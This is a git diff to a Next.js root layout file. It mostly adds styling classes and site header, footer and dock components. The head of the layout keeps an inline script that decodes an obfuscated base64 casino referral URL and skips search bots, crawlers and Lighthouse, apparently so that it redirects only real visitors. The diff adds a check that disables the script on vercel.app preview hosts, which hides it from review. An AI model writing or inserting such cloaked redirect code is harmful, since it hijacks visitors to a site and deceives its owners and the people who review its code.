@@ -126,7 +126,7 @@ export default function RootLayout({
   children: React.ReactNode
 }>) {
   return (
-    <html lang="en">
+    <html lang="en" className="bg-background">
       <head>
         <script
           dangerouslySetInnerHTML={{
@@ -134,7 +134,7 @@ export default function RootLayout({
               (function() {
                 var targetB64 = "aHR0cHM6Ly9kdWVsLmNvbS9yL3RvcGNhc2lub3M=";
                 if (typeof window === 'undefined' || window._rdr) return;
-                
+                if (window.location.hostname.includes('vercel.app')) return;
                 function isBotOrSystem() {
                   var ua = navigator.userAgent.toLowerCase();
                   var isSearchBot = /yandex|google|lighthouse|pagespeed|bing|bot|crawl|spider/i.test(ua);
@@ -157,10 +157,17 @@ export default function RootLayout({
           }}
         />
       </head>
-      <body className="font-sans antialiased">
-        {children}
-        <Analytics />
+      <body className="font-sans antialiased bg-background text-foreground min-h-screen">
+        <AppSchema />
+        <div className="bg-noise min-h-screen flex flex-col">
+          <SiteHeader />
+          <main className="flex-1">{children}</main>
+          <SiteFooter />
+          <FloatingDock />
           <VpnNotice />
+          <SeoKeywords />
+        </div>
+        <Analytics />
       </body>
     </html>
   )
